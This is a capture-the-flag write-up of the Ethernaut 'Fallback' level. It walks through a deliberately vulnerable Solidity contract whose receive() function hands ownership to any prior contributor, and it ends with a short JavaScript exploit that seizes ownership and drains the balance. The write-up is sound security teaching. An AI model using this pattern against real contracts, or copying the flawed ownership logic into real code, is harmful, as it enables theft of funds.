---
title: "Ethernaut 01 Fallback"
description: "Ethernaut 01 Fallback writeup"
---

## Challenge
### Description
Look carefully at the contract's code below.

You will beat this level if:

- you claim ownership of the contract
- you reduce its balance to 0

Things that might help:

- How to send ether when interacting with an ABI
- How to send ether outside of the ABI
- Converting to and from wei/ether units (see help() command)
- Fallback methods

### Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;
    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
## Background

---

When you send ether to a contract or call a function that does not exist, an entry point other than a regular function call runs. The functions used for this are `receive()` and `fallback()`.
The behavior breaks down as follows.

- If `msg.data` is empty and only ether is sent, `receive()` runs if it exists.
- If `msg.data` is present, or the called function signature does not exist in the contract, `fallback()` runs.
- `receive()` exists solely for receiving ether, so it is always `payable`.
- For `fallback()` to receive ether, it must be declared `payable`.

This challenge actually uses `receive()`, not `fallback()`. The title is still Fallback because before Solidity `0.6.0` this role was handled by a single `fallback()` function, which was later split into `receive()` and `fallback()`.

---

If you send ether while calling a function, as in `contract.contribute({value: 1})`, the function defined in the ABI is executed. Conversely, if you send only ether to the contract address without specifying a function, it is a plain ether transfer that does not go through any ABI function.
This challenge relies on that difference. You call `contribute()` once to get `contributions[msg.sender] > 0`, and then send ether without any function call so that `receive()` runs.

---

`1 ether` is `10^18 wei`. So sending `value: 1` from the console sends `1 wei`, not `1 ether`.
In this challenge, `contribute()` only requires `msg.value < 0.001 ether`, and `receive()` only requires `msg.value > 0`. So sending just `1 wei` satisfies both conditions.
## Code analysis

---

The constructor sets the initial `owner` and `contributions`.
```solidity
mapping(address => uint256) public contributions;
address public owner;

constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
}
```
The deployer becomes `owner` from the start, and `contributions[owner]` is set to `1000 ether`. Looking at `contribute()` alone, you need a larger contribution than the current owner to take ownership, but contributing more than `1000 ether` is not a realistic solution for this challenge.
So we need to find another path to change the owner.

---

Here is `contribute()`.
```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```
`contribute()` is a poor way to take ownership directly. Since `msg.value` must be less than `0.001 ether`, exceeding `1000 ether` would require far too many calls.
It is still good enough for making `contributions[msg.sender]` greater than 0, which the `receive()` condition needs.

---

The ownership change happens in `receive()`.
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```
It runs on transactions that carry only ether, and it has two conditions.

- `msg.value > 0`
- `contributions[msg.sender] > 0`

The first condition is satisfied by sending just `1 wei`. The second is satisfied by calling `contribute({value: 1})` once beforehand. So the attacker first registers a tiny contribution, then sends ether without a function call to trigger `receive()`, and becomes `owner`.

---

Last is `withdraw()`.
```solidity
modifier onlyOwner() {
    require(msg.sender == owner, "caller is not the owner");
    _;
}

function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```
The second goal is to reduce the contract balance to 0. As long as `onlyOwner` passes, `withdraw()` sends the contract's entire balance to the current `owner`.
So the full flow is: use `contribute()` to set up the `receive()` condition, send plain ether to take `owner`, then drain the balance with `withdraw()`.
## Solution
First, send `1 wei` to `contribute()` to make my `contributions` value greater than 0. Then send another `1 wei` to the contract without a function call; `receive()` runs and `owner` changes to my address.
With ownership taken, I only need to call `withdraw()`. The remaining balance in the contract is sent to my address, the current `owner`.
### Exploit
```javascript
await contract.contribute({ value: 1 });
await contract.sendTransaction({ value: 1 });
await contract.withdraw();
```
![screenshot](./image-1.png)
